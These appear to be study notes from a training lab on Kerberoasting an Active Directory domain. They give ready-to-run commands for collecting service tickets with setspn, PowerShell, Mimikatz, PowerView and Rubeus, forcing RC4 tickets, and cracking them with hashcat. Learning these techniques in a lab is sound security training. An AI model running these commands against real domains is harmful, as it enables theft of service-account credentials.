## Kerberoasting - Semi Manual method
#### Enumerating SPNs with setspn.exe
```cmd-session
C:\htb> setspn.exe -Q */*
```
We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`.

#### Targeting a Single User
```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

#### Retrieving All Tickets Using setspn.exe
```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
## Extracting Tickets from Memory with Mimikatz
```cmd-session
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export 
```
If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

#### Preparing the Base64 Blob for Cracking
```shell
echo "<base64 blob>" |  tr -d \\n | base64 -d > tgs.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.
#### Extracting the Kerberos Ticket using kirbi2john.py
```shell
 python2.7 kirbi2john.py tgs.kirbi
```
This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.
#### Modifiying crack_file for Hashcat
```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

#### Cracking the Hash with Hashcat
```shell
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

**!!** If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

---
## Automated / Tool Based Route (Easier and prefered)

First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS tickets and convert them to Hashcat format.
#### Using PowerView to Enumerate SPN Accounts
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```
#### Using PowerView to Target a Specific User
```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

#### Exporting All Tickets to a CSV File
```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

----
We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.

#### Using Rubeus (Best method)
#### Using the /stats Flag
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /stats
```
This gives information on the numbers of Kerberoastable account and their encryption method for their tgs

#### Using the /nowrap Flag
Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat.
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```


We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.
#### Using the /tgtdeleg Flag
![[Pasted image 20251104182249.png]]
In the above image, we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256
Here we could downgrade from AES to RC4.

**Note** : This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier, it will work

It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos.
![[Pasted image 20251104182450.png]]